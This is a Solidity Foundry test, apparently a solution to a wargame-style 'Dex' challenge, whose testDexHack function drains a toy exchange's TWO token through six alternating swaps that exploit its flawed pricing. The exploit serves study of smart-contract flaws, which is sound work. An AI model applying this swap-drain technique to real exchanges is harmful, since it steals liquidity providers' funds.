// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import { Dex, SwappableToken } from "./Dex.sol";

contract DexTest is Test {
    Dex dex;

    SwappableToken ONE;
    SwappableToken TWO;

    address deployer = vm.addr(4);
    address whale = vm.addr(1777);
    address h3x0r = vm.addr(1337);

    function setUp() public {
        vm.startPrank(deployer);
        ONE = new SwappableToken("Numero Uno", "ONE", 110);
        TWO = new SwappableToken("Numero Dos", "TWO", 110);
        dex = new Dex(address(ONE), address(TWO));
        ONE.transfer(whale, 100);
        TWO.transfer(whale, 100);
        ONE.transfer(h3x0r, 10);
        TWO.transfer(h3x0r, 10);
        vm.stopPrank();

        vm.startPrank(whale);
        ONE.approve(address(dex), 100);
        TWO.approve(address(dex), 100);
        dex.add_liquidity(address(ONE), 100);
        dex.add_liquidity(address(TWO), 100);
        vm.stopPrank();
    }

    function balanceLogger() internal {
        emit log_named_uint("h3x0r ONE balance", ONE.balanceOf(h3x0r));
        emit log_named_uint("h3x0r TWO balance", TWO.balanceOf(h3x0r));
        emit log_named_uint("dex ONE balance", ONE.balanceOf(address(dex)));
        emit log_named_uint("dex TWO balance", TWO.balanceOf(address(dex)));
        console.log("----------------------");
    }


    function testDexHack() public {
        vm.startPrank(h3x0r);

        ONE.approve(address(dex), 300);
        TWO.approve(address(dex), 300);

        balanceLogger();

        dex.swap(address(TWO), address(ONE), 10);
        dex.swap(address(ONE), address(TWO), 20);
        dex.swap(address(TWO), address(ONE), 24);
        dex.swap(address(ONE), address(TWO), 30);
        dex.swap(address(TWO), address(ONE), 41);
        dex.swap(address(ONE), address(TWO), 45);

        // drained TWO token
        balanceLogger();
        assertEq(TWO.balanceOf(address(dex)), 0);
    }
}